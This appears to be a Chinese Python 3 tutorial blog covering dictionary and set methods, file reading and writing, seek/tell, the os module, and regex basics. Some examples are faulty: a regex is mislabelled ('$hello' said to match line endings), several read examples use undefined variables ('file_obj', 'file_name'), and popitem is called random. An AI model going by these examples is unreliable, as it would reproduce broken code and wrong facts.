<h3 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">	对象.方法(条件)</span><br><span class="line"></span><br><span class="line">对象名.get(key，默认值) 该方法用来根据键来获取字典中的值，获取不到会返回默认值</span><br><span class="line"><span class="built_in">print</span>(对象名.get(key))</span><br><span class="line"></span><br><span class="line">修改字典，如果key存在则覆盖，不存在则添加</span><br><span class="line">对象名[key] = value</span><br><span class="line"></span><br><span class="line">setdefault(key[, default]) 可以用来向字典中添加key-value</span><br><span class="line">  如果key已经存在于字典中，则返回key的值，不会对字典做任何操作</span><br><span class="line">  如果key不存在，则向字典中添加这个key，并设置value</span><br><span class="line">对象名.setdefault(key,value)</span><br><span class="line"></span><br><span class="line">update([other])</span><br><span class="line">将其他的字典中的key-value添加到当前字典中</span><br><span class="line">如果有重复的key，则后边的会替换到当前的</span><br><span class="line">d = &#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>:<span class="number">2</span>,<span class="string">&#x27;c&#x27;</span>:<span class="number">3</span>&#125;</span><br><span class="line">d2 = &#123;<span class="string">&#x27;d&#x27;</span>:<span class="number">4</span>,<span class="string">&#x27;e&#x27;</span>:<span class="number">5</span>,<span class="string">&#x27;f&#x27;</span>:<span class="number">6</span>, <span class="string">&#x27;a&#x27;</span>:<span class="number">7</span>&#125;</span><br><span class="line">d.update(d2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> 用来删除key-value</span><br><span class="line"><span class="keyword">del</span> 对象名[key]</span><br><span class="line"></span><br><span class="line">popitem()随机删除字典中的一个键值对，一般都会删除最后一个键值对，并返回删除的键值对</span><br><span class="line">变量 = 对象名.popitem()</span><br><span class="line"></span><br><span class="line">pop()根据key删除key-value并返回，指定默认值若不存在Key则返回默认值</span><br><span class="line">变量 = 对象名.pop(key,默认值)</span><br><span class="line"></span><br><span class="line">clear()用来清空字典</span><br><span class="line">对象名.clear()</span><br><span class="line"></span><br><span class="line">copy()方法:复制</span><br><span class="line">变量 = 对象名.copy()</span><br><span class="line"></span><br><span class="line">fromkeys()	返回拥有指定键和值的字典</span><br><span class="line">x = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line">y = <span class="number">1</span></span><br><span class="line">z = <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"></span><br><span class="line">a = <span class="built_in">dict</span>.fromkeys(x,y)</span><br><span class="line">&#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;c&#x27;</span>:<span class="number">1</span>&#125;</span><br><span class="line">b = <span class="built_in">dict</span>.fromkeys(x,z)</span><br><span class="line">&#123;<span class="string">&#x27;a&#x27;</span>:(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>),<span class="string">&#x27;b&#x27;</span>:(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>),<span class="string">&#x27;c&#x27;</span>:(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)&#125;</span><br><span class="line"></span><br><span class="line">a.fromkeys(a)</span><br><span class="line">&#123;<span class="string">&#x27;a&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;b&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;c&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">a.fromkeys(x,y)</span><br><span class="line">&#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;c&#x27;</span>: <span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure>



<h2 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h2><p>​        Python中的集合（set）与数学中的集合概念类似，也是用于保存不重复的元素。它有可变集合（set）和不可变集合（frozenset）两种。</p>
<p>​        在形式上，集合的所有元素都放在一对大括号“{}”中，两个相邻元素间使用逗号“,”分隔。集合最好的应用就是去重，因为集合中的每个元素都是唯一的。</p>
<p>集合和序列非常相似：</p>
<p>不同点：</p>
<p>1.集合中只能存储不可变对象<br>2.集合中存储的对象是无序（不是按照元素的插入顺序保存）<br>3.集合中不能出现重复的元素</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">	变量 = &#123;元素<span class="number">1</span>,元素<span class="number">2.</span>.....&#125;</span><br><span class="line">	</span><br><span class="line">可以通过<span class="built_in">set</span>()来将序列和字典转换为集合</span><br><span class="line">变量 = <span class="built_in">set</span>([元素<span class="number">1</span>,元素<span class="number">2.</span>.....])</span><br><span class="line">变量 = <span class="built_in">set</span>(&#123;key:value,key:value.......&#125;)</span><br><span class="line">使用<span class="built_in">set</span>()将字典转换为集合时，只会包含字典中的键</span><br></pre></td></tr></table></figure>



<h3 id="方法-2"><a href="#方法-2" class="headerlink" title="方法"></a>方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">	对象.方法(条件)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add() 向集合中添加元素</span></span><br><span class="line">对象名.add(元素)</span><br><span class="line"></span><br><span class="line"><span class="comment"># update() 将一个集合中的元素添加到当前集合中</span></span><br><span class="line"><span class="comment"># update()可以传递序列或字典作为参数，字典只会使用键</span></span><br><span class="line">s2 = <span class="built_in">set</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">对象<span class="number">1.</span>update(对象<span class="number">2</span>)</span><br><span class="line">对象名.update([元素<span class="number">1</span>，元素<span class="number">2.</span>.....])</span><br><span class="line">对象名.update(&#123;key:value,key:value.......&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pop()随机删除并返回一个集合中的元素</span></span><br><span class="line">变量 = 对象名.pop()</span><br><span class="line"></span><br><span class="line"><span class="comment"># remove()删除集合中的指定元素</span></span><br><span class="line">对象名.remove(元素)</span><br><span class="line"></span><br><span class="line"><span class="comment"># clear()清空集合</span></span><br><span class="line">对象名.clear()</span><br><span class="line"></span><br><span class="line"><span class="comment"># copy()对集合进行浅复制</span></span><br><span class="line">变量 = 对象名.copy()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在对集合做运算时，不会影响原来的集合，而是返回一个运算结果</span></span><br><span class="line"><span class="comment"># 创建两个集合</span></span><br><span class="line">s = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;</span><br><span class="line">s2 = &#123;<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># &amp; 交集运算</span></span><br><span class="line">result = s &amp; s2 <span class="comment"># &#123;3, 4, 5&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># | 并集运算</span></span><br><span class="line">result = s | s2 <span class="comment"># &#123;1,2,3,4,5,6,7&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># - 差集</span></span><br><span class="line">result = s - s2 <span class="comment"># &#123;1, 2&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ^ 异或集 获取只在一个集合中出现的元素</span></span><br><span class="line">result = s ^ s2 <span class="comment"># &#123;1, 2, 6, 7&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;= 检查一个集合是否是另一个集合的子集</span></span><br><span class="line"><span class="comment"># 如果a集合中的元素全部都在b集合中出现，那么a集合就是b集合的子集，b集合是a集合超集</span></span><br><span class="line">a = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;</span><br><span class="line">b = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;</span><br><span class="line"></span><br><span class="line">result = a &lt;= b <span class="comment"># True</span></span><br><span class="line">result = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125; &lt;= &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125; <span class="comment"># True</span></span><br><span class="line">result = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125; &lt;= &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125; <span class="comment"># False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt; 检查一个集合是否是另一个集合的真子集</span></span><br><span class="line"><span class="comment"># 如果超集b中含有子集a中所有元素，并且b中还有a中没有的元素，则b就是a的真超集，a是b的真子集</span></span><br><span class="line">result = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125; &lt; &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125; <span class="comment"># False</span></span><br><span class="line">result = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125; &lt; &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125; <span class="comment"># True</span></span><br><span class="line"></span><br><span class="line">difference()	返回包含两个或更多集合之间差异的集合。</span><br><span class="line">difference_update()	删除此集合中也包含在另一个指定集合中的项目。</span><br><span class="line">discard()	删除指定项目。</span><br><span class="line">intersection()	返回为两个其他集合的交集的集合。</span><br><span class="line">intersection_update()	删除此集合中不存在于其他指定集合中的项目。</span><br><span class="line">isdisjoint()	返回两个集合是否有交集。</span><br><span class="line">issubset()	返回另一个集合是否包含此集合。</span><br><span class="line">issuperset()	返回此集合是否包含另一个集合。</span><br><span class="line">symmetric_difference()	返回具有两组集合的对称差集的集合。</span><br><span class="line">symmetric_difference_update()	插入此集合和另一个集合的对称差集。</span><br><span class="line">union()	返回包含集合并集的集合。</span><br><span class="line">update()	用此集合和其他集合的并集来更新集合。</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>编程语言</category>
        <category>Python3</category>
        <category>Python3基础</category>
      </categories>
      <tags>
        <tag>Python3</tag>
      </tags>
  </entry>
  <entry>
    <title>Python3-文件与目录</title>
    <url>//aeab54f73184.html</url>
    <content><![CDATA[<h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><p>通过python程序对计算机中的各种文件进行增删改查等操作</p>
<p>I/O (input/output)</p>
<p>在windows系统使用路径时，可以使用<code>/</code>来代替 <code>\</code><br>或者可以使用 <code>\\ </code>来代替 <code>\</code><br>或者也可以使用原始字符串<code> r&#39;xxx&#39;</code><br>表示路径，可以使用<code>..</code>来返回一级目录</p>
<h2 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">open</span>(file, mode=<span class="string">&#x27;r&#x27;</span>, buffering=-<span class="number">1</span>, encoding_=<span class="literal">None</span>, errors=<span class="literal">None</span>, newline=<span class="literal">None</span>, closefd=<span class="literal">True</span>, opener=<span class="literal">None</span>)</span><br><span class="line">参数：</span><br><span class="line">	<span class="built_in">open</span>(file) 要打开的文件的名字（路径）</span><br><span class="line">返回值：</span><br><span class="line">	返回一个对象，这个对象就代表了当前打开的文件</span><br><span class="line">    </span><br><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line">file = <span class="built_in">open</span>(a)</span><br><span class="line"><span class="built_in">print</span>(file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># with...as 语句</span></span><br><span class="line"><span class="comment"># 通过with语句，在处理文件时，不论是否抛出异常，都可以保证关闭已经打开的文件</span></span><br><span class="line"><span class="comment"># as后跟自定义变量</span></span><br><span class="line"><span class="comment"># 在with语句中可以直接使用file_obj来做文件操作</span></span><br><span class="line"><span class="comment"># 这个文件只能在with中使用，一旦with结束则文件会自动close()</span></span><br><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(a) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="built_in">print</span>(file.read())</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 调用open()来打开一个文件，可以将文件分成两种类型</span></span><br><span class="line"><span class="comment"># 一种，是纯文本文件（使用utf-8等编码编写的文本文件）</span></span><br><span class="line"><span class="comment"># 一种，是二进制文件（图片、mp3、ppt等这些文件）</span></span><br><span class="line"><span class="comment"># open()打开文件时，默认是以文本文件的形式打开的，但是open()默认的编码为None</span></span><br><span class="line"><span class="comment"># encodint可以设置指定文件的编码</span></span><br><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(a,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">		<span class="built_in">print</span>(file.read())</span><br></pre></td></tr></table></figure>



<h2 id="关闭文件"><a href="#关闭文件" class="headerlink" title="关闭文件"></a>关闭文件</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 关闭文件</span></span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>



<h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line">file = <span class="built_in">open</span>(a)</span><br><span class="line">b = file.read()</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取大文件</span></span><br><span class="line"><span class="comment"># 如果要读取的文件较大的话，会一次性将文件的内容加载到内存中，容易导致内存泄漏</span></span><br><span class="line"><span class="comment"># 所以不能直接调用read()</span></span><br><span class="line"><span class="comment"># read()可以接收一个size作为参数，该参数用来指定要读取的字符的数量</span></span><br><span class="line"><span class="comment">#   默认值为-1，它会读取文件中的所有字符</span></span><br><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	<span class="keyword">with</span> <span class="built_in">open</span>(a,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">		content = file_obj.read(-<span class="number">1</span>)</span><br><span class="line">		content = file_obj.read(<span class="number">20</span>)</span><br><span class="line">		<span class="built_in">print</span>(content)</span><br><span class="line">		<span class="built_in">print</span>(<span class="built_in">len</span>(content))</span><br><span class="line"><span class="keyword">except</span> FileNotFoundError :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;file_name&#125;</span> 这个文件不存在！&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取大文件方法二</span></span><br><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	<span class="keyword">with</span> <span class="built_in">open</span>(a,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">		<span class="comment"># 定义一个变量，来保存文件的内容</span></span><br><span class="line">        file_content = <span class="string">&#x27;&#x27;</span></span><br><span class="line">		<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">			content = file_obj.read(<span class="number">100</span>)</span><br><span class="line">			<span class="keyword">if</span> <span class="keyword">not</span> content:</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			<span class="comment"># print(content,end=&#x27;&#x27;)</span></span><br><span class="line">			<span class="comment"># 利用拼串的方式分块读取内容</span></span><br><span class="line">			file_content += content</span><br><span class="line"><span class="keyword">except</span> FileNotFoundError :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;file_name&#125;</span> 这个文件不存在！&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(file_content)</span><br></pre></td></tr></table></figure>



<h2 id="readline"><a href="#readline" class="headerlink" title="readline()"></a>readline()</h2><p>readline() 该方法可以用来读取一行内容<br>readlines()    该方法用于一行一行读取内容，会一次性把读取到的内容封装到列表中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">import</span> pprint <span class="comment"># 当字符超过80字节时，用来美化输出</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(a,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">	<span class="built_in">print</span>(file.readline(),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	<span class="comment"># r = file.readlines()</span></span><br><span class="line">    <span class="comment"># pprint.pprint(r)</span></span><br><span class="line">    <span class="comment"># pprint.pprint(r[1])</span></span><br><span class="line"><span class="comment"># for循环也可以一行行读取数据</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> file:</span><br><span class="line">	<span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>



<h2 id="tell"><a href="#tell" class="headerlink" title="tell()"></a>tell()</h2><p><code>tell()</code>方法用来查看当前读取位置</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file_obj:</span><br><span class="line"><span class="comment"># rb是读取二进制文件，所以read读取一百个字节，字母是一个字节，汉字是三个</span></span><br><span class="line">    <span class="built_in">print</span>(file_obj.read(<span class="number">130</span>))</span><br><span class="line">    <span class="comment"># 读取前130个字节</span></span><br><span class="line">    <span class="built_in">print</span>(file_obj.tell())</span><br><span class="line">    <span class="comment"># 返回当前读取的位置，返回的是字节位置，不是行数</span></span><br></pre></td></tr></table></figure>



<h2 id="seek"><a href="#seek" class="headerlink" title="seek()"></a>seek()</h2><p><code>seek()</code>用来修改当前读取的位</p>
<p><code>seek()</code>需要两个参数，第一个是要切换到的位置，第二个是计算位置方式</p>
<p>可选值：</p>
<ul>
<li>0： 从头计算，默认值</li>
<li>1：从当前位置计算</li>
<li>2：从最后位置开始计算</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file_obj:</span><br><span class="line"><span class="comment"># 使用seek(x,2)的时候，用r+可能导致报错，推荐使用rb</span></span><br><span class="line"><span class="comment"># rb是读取二进制文件，所以read读取一百个字节，字母是一个字节，汉字是三个</span></span><br><span class="line">    <span class="built_in">print</span>(file_obj.read(<span class="number">130</span>))</span><br><span class="line">    <span class="comment"># 读取前130个字节</span></span><br><span class="line">    <span class="built_in">print</span>(file_obj.tell())</span><br><span class="line">    <span class="comment"># 返回当前读取的位置，返回的是字节位置，不是行数</span></span><br><span class="line">    file_obj.seek(<span class="number">50</span>)</span><br><span class="line">    <span class="comment"># 修改当前读取的位置为50字节</span></span><br><span class="line">    file_obj.seek(<span class="number">50</span>,<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 从50个字节起读取50个字节</span></span><br><span class="line">    file_obj.seek(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">    <span class="comment"># 读取最后一个之后的,会什么都读取不到</span></span><br><span class="line">    file_obj.seek(-<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">    <span class="comment"># 读取最后一个字节</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;当前读取的位置是:&#x27;</span>,file_obj.tell())</span><br></pre></td></tr></table></figure>



<h2 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h2><table>
<thead>
<tr>
<th align="center">参数</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">t</td>
<td align="center">文本模式（默认）</td>
</tr>
<tr>
<td align="center">x</td>
<td align="center">写模式，新建文件，如果该文件存在则报错</td>
</tr>
<tr>
<td align="center">b</td>
<td align="center">二进制模式</td>
</tr>
<tr>
<td align="center">+</td>
<td align="center">打开一个文件（可读可写）</td>
</tr>
<tr>
<td align="center">U</td>
<td align="center">通用换行模式（不推荐）</td>
</tr>
<tr>
<td align="center">r</td>
<td align="center">以只读方式打开文件（默认），文件不存在则报错</td>
</tr>
<tr>
<td align="center">rb</td>
<td align="center">以只读方式打开二进制文件（默认）</td>
</tr>
<tr>
<td align="center">r+</td>
<td align="center">以读写的方式打开一个文件</td>
</tr>
<tr>
<td align="center">rb+</td>
<td align="center">以读写的方式打开一个二进制文件</td>
</tr>
<tr>
<td align="center">w</td>
<td align="center">以只写的方式打开一个文件，如果文件存在则覆盖，文件不存在则新建文件</td>
</tr>
<tr>
<td align="center">wb</td>
<td align="center">以只写的方式打开一个二进制文件，如果文件存在则覆盖，文件不存在则新建文件</td>
</tr>
<tr>
<td align="center">w+</td>
<td align="center">以读写的方式打开一个文件，如果文件存在则覆盖，文件不存在则新建文件</td>
</tr>
<tr>
<td align="center">wb+</td>
<td align="center">以读写的方式打开一个二进制文件，如果文件存在则覆盖，文件不存在则新建文件</td>
</tr>
<tr>
<td align="center">a</td>
<td align="center">以追加的方式写入一个文件，如果文件存在则在末尾追加，文件不存在则新建文件</td>
</tr>
<tr>
<td align="center">ab</td>
<td align="center">以追加的方式写入一个二进制文件，如果文件存在则在末尾追加，文件不存在则新建文件</td>
</tr>
<tr>
<td align="center">a+</td>
<td align="center">以追加的方式读写一个文件，如果文件存在则在末尾追加，文件不存在则新建文件</td>
</tr>
<tr>
<td align="center">ab+</td>
<td align="center">以追加的方式读写一个二进制文件，如果文件存在则在末尾追加，文件不存在则新建文件</td>
</tr>
</tbody></table>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 文件写入</span></span><br><span class="line"><span class="comment"># 如果不指定操作类型，则默认是 读取文件 ， 而读取文件时是不能向文件中写入的</span></span><br><span class="line">name = <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(name,<span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">	<span class="comment"># write()来向文件中写入内容，不会自动换行</span></span><br><span class="line">    <span class="comment"># 如果操作的是一个文本文件的话，则write()需要传递一个字符串作为参数</span></span><br><span class="line">    <span class="comment"># 该方法会可以分多次向文件中写入内容</span></span><br><span class="line">    <span class="comment"># 写入完成以后，该方法会返回写入的字符的个数</span></span><br><span class="line">	file.write(<span class="string">&#x27;hello\n&#x27;</span>)</span><br><span class="line">	r = file.write(<span class="built_in">str</span>(<span class="number">123</span>))</span><br></pre></td></tr></table></figure>



<h2 id="二进制文件"><a href="#二进制文件" class="headerlink" title="二进制文件"></a>二进制文件</h2><p>二进制文件<br>所有文件分为文本文件和二进制文件<br>读取模式<br>t 读取文本文件（默认值）<br>b 读取二进制文件<br>读取文本文件时，size是以字符为单位的<br>读取二进制文件时，size是以字节为单位</p>
<p>rb是读取二进制文件，所以read读取一百个字节，字母是一个字节，汉字是三个</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file_name = <span class="string">&quot;xxx/xxx.jpg&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_name,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file_obj:</span><br><span class="line">    new_name = <span class="string">&quot;new.jpg&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(new_name,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> new_obj:</span><br><span class="line">        chunk = <span class="number">1024</span> * <span class="number">100</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            content = file_obj.read(chunk)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> content:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            new_obj.write(content)</span><br></pre></td></tr></table></figure>



<h2 id="检查文件是否存在"><a href="#检查文件是否存在" class="headerlink" title="检查文件是否存在"></a>检查文件是否存在</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file_name = <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name) <span class="keyword">as</span> file_obj :</span><br><span class="line">        <span class="built_in">print</span>(file_obj.read())</span><br><span class="line"><span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;file_name&#125;</span> 文件不存在~~&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="OS模块"><a href="#OS模块" class="headerlink" title="OS模块"></a>OS模块</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line">path = os.listdir()</span><br><span class="line"><span class="comment"># os.listdir()获取指定目录的结构，默认获取当前路径，返回一个列表</span></span><br><span class="line">path1 = os.getcwd()</span><br><span class="line"><span class="comment"># os.getcwd()获取当前所在的路径</span></span><br><span class="line">os.chdir(<span class="string">&quot;c:\\xxx\\xxx&quot;</span>)</span><br><span class="line"><span class="comment"># os.chdir(&quot;c:\\&quot;&quot;)修改当前路径为xxx</span></span><br><span class="line">pprint.pprint(path1)</span><br><span class="line"></span><br><span class="line">os.mkdir(<span class="string">&quot;xxx&quot;</span>)</span><br><span class="line"><span class="comment"># 在当前路径下创建一个目录</span></span><br><span class="line">os.rmdir(<span class="string">&quot;xxx&quot;</span>)</span><br><span class="line"><span class="comment"># 在当前路径下删除一个目录</span></span><br><span class="line">os.remove(<span class="string">&quot;xxx.txt&quot;</span>)</span><br><span class="line"><span class="comment"># 在当前路径下删除文件</span></span><br><span class="line">os.rename(<span class="string">&quot;旧名字&quot;</span>,<span class="string">&quot;新名字&quot;</span>)</span><br><span class="line"><span class="comment"># 对文件重命名</span></span><br><span class="line">os.rename(<span class="string">&quot;文件名&quot;</span>,<span class="string">&quot;路径/文件名&quot;</span>)</span><br><span class="line"><span class="comment"># 也可以用来移动文件</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>编程语言</category>
        <category>Python3</category>
        <category>Python3基础</category>
      </categories>
      <tags>
        <tag>Python3</tag>
      </tags>
  </entry>
  <entry>
    <title>Python3-正则表达式</title>
    <url>//a5f0dc9a4619.html</url>
    <content><![CDATA[<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>​        正则表达式（Regular Expression，常简写为regex或者RE），又称规则表达式，它不是某个编程语言所特有的，是计算机科学的一个概念，通常被用来检索和替换符合某些规则的文本。</p>
<p>在Python中，可以使用正则表达式进行与字符串相关的一些匹配。</p>
<h2 id="行定位符"><a href="#行定位符" class="headerlink" title="行定位符"></a>行定位符</h2><p>行定位符就是用来描述字符串的边界，<code>^</code>表示行的开始，<code>$</code>表示行的结束</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">^hello</span><br><span class="line">匹配开头为hello的字符串</span><br><span class="line"></span><br><span class="line">$hello</span><br><span class="line">匹配结尾为hello的字符串</span><br></pre></td></tr></table></figure>



<h2 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h2><table>
<thead>
<tr>
<th align="center">代码</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">.</td>
<td align="center">匹配除换行符外的任意字符</td>
</tr>
<tr>
<td align="center">\</td>
<td align="center">特殊序列的标志，也可以用来转义字符</td>
</tr>
<tr>
<td align="center">[a-d]</td>
<td align="center">匹配从a到d的所有字符</td>
</tr>
<tr>
<td align="center">[^a-d]</td>
<td align="center">匹配除了a-d的所有字符</td>
</tr>
<tr>
<td align="center">^</td>
<td align="center">匹配字符串的开始</td>
</tr>
<tr>
<td align="center">$</td>
<td align="center">匹配字符串的结束</td>
</tr>
<tr>
<td align="center">|</td>
<td align="center">匹配左右任意一个表达式</td>
</tr>
<tr>
<td align="center">(ab)</td>
<td align="center">将括号中字符作为一个分组</td>
</tr>
<tr>
<td align="center">\num</td>
<td align="center">引用分组num匹配到的字符串</td>
</tr>
<tr>
<td align="center">a(?=xxx)</td>
<td align="center">正前瞻，a后面的内容要匹配xxx</td>
</tr>
<tr>
<td align="center">a(?!xxx)</td>
<td align="center">负前瞻，a后面的内容不能匹配xxx</td>
</tr>
<tr>
<td align="center">(?&lt;=xxx)a</td>
<td align="center">正回顾，a前面的内容要匹配xxx</td>
</tr>
<tr>
<td align="center">(?&lt;!xxx)a</td>
<td align="center">负回顾，a前面的内容不能匹配xxx</td>
</tr>
</tbody></table>
<h2 id="限定符"><a href="#限定符" class="headerlink" title="限定符"></a>限定符</h2><p>限定符也就是指定数量的字符</p>
<table>
<thead>
<tr>
<th align="center">限定符</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">?</td>
<td align="center">匹配前面的字符0次或者一次(精确匹配)</td>
</tr>
<tr>
<td align="center">+</td>
<td align="center">匹配前面的字符一次或者多次</td>
</tr>
<tr>
<td align="center">*</td>
<td align="center">匹配前面的字符0次或者多次(可以匹配不到)</td>
</tr>
<tr>
<td align="center">{n}</td>
<td align="center">匹配前面的字符n个</td>
</tr>
<tr>
<td align="center">{n,}</td>
<td align="center">匹配前面的字符最少n个</td>
</tr>
<tr>
<td align="center">{n,m}</td>
<td align="center">匹配前面的字符最少n个，最多m个</td>
</tr>
</tbody></table>
